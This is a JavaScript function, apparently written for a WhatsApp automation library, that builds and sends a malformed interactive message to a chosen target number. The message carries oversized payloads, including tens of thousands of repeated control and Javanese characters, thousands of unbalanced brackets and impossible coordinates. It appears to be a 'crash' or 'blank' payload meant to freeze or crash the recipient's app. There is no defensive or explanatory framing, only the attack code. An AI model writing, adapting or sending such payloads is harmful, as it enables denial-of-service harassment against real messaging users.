async function BlankNew(target) {
  const content = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 1,
              expiryTimestamp: null
            }
          },
          externalAdReply: {
            showAdAttribution: false,
            renderLargerThumbnail: true
          },
          header: {
            title: "_ WhatitsDhes - Blank _",
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: 992.999999,
              degreesLongitude: -932.8889989,
              name: "\u900A",
              address: "\u0007".repeat(20000)
            }
          },
          body: {
            text: "_ WhatitsDhes - Blank _"
          },
          interactiveResponseMessage: {
            body: {
              text: "_ WhatitsDhes - Blank_",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              status: true,
              messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
              paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "_ Kipop - Blank _",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "cyber@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(70000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }`,
              version: 3
            }
          }
        }
      }
    }
  };

  const msg = await generateWAMessageFromContent(target, content, {});

  await sock.relayMessage(
    target,
    msg.message,
    { messageId: msg.key.id }
  );
}